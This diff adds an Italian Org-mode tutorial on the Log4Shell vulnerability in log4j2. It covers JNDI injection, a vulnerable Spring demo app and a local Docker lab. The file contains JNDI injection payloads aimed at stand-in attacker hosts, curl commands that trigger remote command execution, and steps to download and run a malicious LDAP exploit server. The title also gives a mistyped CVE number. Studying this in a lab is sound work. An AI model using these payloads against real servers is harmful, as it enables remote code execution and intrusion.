@@ -1,0 +1,268 @@
+#+TITLE: Log4Shell – CVE-2021-4428 (ITA)
+#+AUTHOR: Leonardo Tamiano
+
+* Introduzione
+  Questa vulnerabilità, chiamata ~Log4Shell~, è relativa al software
+  ~log4j2~, una libreria di logging scritta in Java ed utilizzata in
+  molti progetti Java.
+
+  Le versioni affette da questa vulnerabilità sono le versioni di
+  ~log4j~ da ~2.0~ a ~2.14.1~.
+
+  La versione ~2.15.0~ è stata rilasciata nel repository Maven:
+  - https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.15.0/
+
+* Requisiti
+  Per far funzionare l'exploit devono essere soddisfatti i necessari
+  requisiti:
+
+  - Un server che utilizza una versione vulnerabile di ~log4j~.
+
+  - Un endpoint che permette ad un attaccante di inviare un messaggio al server.
+
+  - Il server che riceve il messaggio che deve poi utilizzare la
+    versione vulnerabile di ~log4j~ per loggare quel messaggio.
+
+* JNDI and JNDI Injections
+  The ~Log4Shell~ vulnerability (CVE-2021-44228) is a simple ~JNDI
+  injection flaw~ but in a bad place.
+
+  ----------------------
+
+  Se log4j si trova a loggare messaggi del tipo
+
+  #+begin_example
+${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}
+  #+end_example
+
+  ovvero con placeholders, log4j effettua un ~JNDIlookup()~.
+
+  ----------------------
+
+  La ~JNDI~ sta per ~Java Naming and Directory Interface~, una java API
+  che permette di connettere una applicazione Java ad un ~extrnal
+  directory service~, come ad esempio un server ~LDAP~.
+
+  In una installazione di default di JNDI, sono due i protocolli
+  supportati: RMI e LDAP. In entrambi i casi la chiamata di lookup()
+  deve ritornare un Java Object.
+
+  #+begin_example
+Long story short:
+ - Do not rely on a current Java version to save you.
+ - Update Log4 (or remove the JNDI lookup).
+ - Disable the expansion (seems a pretty bad idea anyways).
+  #+end_example
+  
+* Exploit steps
+
+  1. L'utente invia il payload malevolo al server (qualsiasi protocollo).
+
+     #+begin_example
+${jndi:ldap://attacker.com/a}
+     #+end_example
+  
+  2. Il server logga il payload presente nella richiesta tramite ~log4j~.
+     
+  3. La vulnerabilità di log4j viene triggerata, e una richiesta viene
+     fatta al sito ~attacker.com~ tramite un JNDI lookup()
+
+  4. La risposta del lookup() contiene la path (URL) ad una classe
+     java remota, ovvero un file .class hostato in un wb server, tipo
+
+     #+begin_example
+http://second-stage.attacker.com/Exploit.class
+     #+end_example
+
+     che viene iniettato nel processo del server.
+
+  5. Questo payload permette poi di ottenere una RCE nel server.
+  
+* Esempio
+  Consideriamo i seguenti due codici java, che rappresentano una
+  semplice applicazione Spring vulnerabile a questo attacco.
+
+  codice: ~VulnerableAppApplication.java~
+  #+begin_src java
+package fr.christophetd.log4shell.vulnerableapp;
+
+import org.springframework.boot.SpringApplication;
+import org.springframework.boot.autoconfigure.SpringBootApplication;
+
+@SpringBootApplication
+public class VulnerableAppApplication {
+
+	public static void main(String[] args) {
+		SpringApplication.run(VulnerableAppApplication.class, args);
+	}
+
+}  
+  #+end_src
+
+  codice: ~MainController.java~
+  #+begin_src java
+package fr.christophetd.log4shell.vulnerableapp;
+
+
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestHeader;
+import org.springframework.web.bind.annotation.RestController;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+@RestController
+public class MainController {
+
+    private static final Logger logger = LogManager.getLogger("HelloWorld");
+
+    @GetMapping("/")
+    public String index(@RequestHeader("X-Api-Version") String apiVersion) {
+        logger.info("Received a request for API version " + apiVersion);
+        return "Hello, world!";
+    }
+
+}
+  #+end_src
+
+  Come possiamo vedere, l'unica cosa che che fa questa applicazione è
+  utilizzare la funzione ~logger.info()~ per loggare il messaggio
+  contenuto nel campo HTTP-header chiamato ~X-Api-Version~.
+
+  --------------------
+
+  Per exploitare questo codice bastera inviare la seguente richiesta
+  con ~curl~
+
+  #+begin_src sh
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+  #+end_src
+
+  Notiamo che il payload malevolo nel campo ~X-Api-Version~ è il seguente
+
+  #+begin_example
+${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}
+  #+end_example
+
+  Questo payload utilizza la ~JNDI~, ovvero la ~Java Naming and Directory
+  Interface~, una java API che permette di connettere una applicazione
+  Java ad un ~extrnal directory service~, come ad esempio un server
+  ~LDAP~.
+
+  LDAP è un "lightweight directory access protocol", ovvero un
+  protocollo che permette alle applicazioni di richiedere informazioni
+  riguardanti gli utenti in modo veloce e flessibile.
+
+  Per far funzionare il payload malevolo mostrato in alto dobbiamo
+  prima lanciare un nostro server LDAP malevolo.
+
+  -----------------------
+
+* Risorse
+  Per la realizzazione di questo articolo sono state utilizzate le
+  seguenti risorse:
+
+  - https://www.lunasec.io/docs/blog/log4j-zero-day/
+  - https://www.okta.com/identity-101/what-is-ldap/
+  - https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
+  - https://mbechler.github.io/2018/01/20/Java-CVE-2018-2633/
+  - [[https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java][malicious LDAP server]]
+
+* Video walkthrough
+  Spiegazione exploit generica.
+
+** Demo su kali
+  - Installazione docker
+
+    #+begin_src sh
+sudo apt-get install docker.io
+    #+end_src
+
+  - Esecuzione macchine per exploit
+    
+    https://github.com/christophetd/log4shell-vulnerable-app
+
+    1. Spring application con log4j vulnerabile a log4shell
+
+       #+begin_src sh
+docker run --name vulnerable-app --network="host" -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+       #+end_src
+
+  2. server LDAP malevolo
+
+     #+begin_src sh
+wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
+unzip JNDIExploit.v1.2.zip
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+   #+end_src
+
+  3. A questo punto lo possiamo lanciare con
+
+     #+begin_src sh
+# will execute 'touch /tmp/pwned'
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+     #+end_src
+
+  Notiamo l'output del server LDAP e verifichiamo che il comando sia
+  stato eseguito con
+
+  #+begin_src sh
+docker exec vulnerable-app ls /tmp
+  #+end_src
+
+** Analisi codice  
+   Analisi codice:
+
+*** codice vulnerabile log4j
+
+     ~MainController.java~
+     #+begin_src java
+package fr.christophetd.log4shell.vulnerableapp;
+
+
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestHeader;
+import org.springframework.web.bind.annotation.RestController;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+@RestController
+public class MainController {
+
+    private static final Logger logger = LogManager.getLogger("HelloWorld");
+
+    @GetMapping("/")
+    public String index(@RequestHeader("X-Api-Version") String apiVersion) {
+	logger.info("Received a request for API version " + apiVersion);
+	return "Hello, world!";
+    }
+
+}
+     #+end_src
+
+     ~VulnerableAppApplication.java~
+     #+begin_src java
+package fr.christophetd.log4shell.vulnerableapp;
+
+import org.springframework.boot.SpringApplication;
+import org.springframework.boot.autoconfigure.SpringBootApplication;
+
+@SpringBootApplication
+public class VulnerableAppApplication {
+
+    public static void main(String[] args) {
+	SpringApplication.run(VulnerableAppApplication.class, args);
+    }
+
+}
+     #+end_src
+
+*** codice malevolo LDAP
+    https://github.com/feihong-cs/JNDIExploit
+
+    File interessanti:
+
+    - src/main/jav/com/feihong/ldap/Starter.java
+    - src/main/jav/com/feihong/ldap/LdapServer.java
+    - src/main/jav/com/feihong/ldap/template/CommandTemplate.java
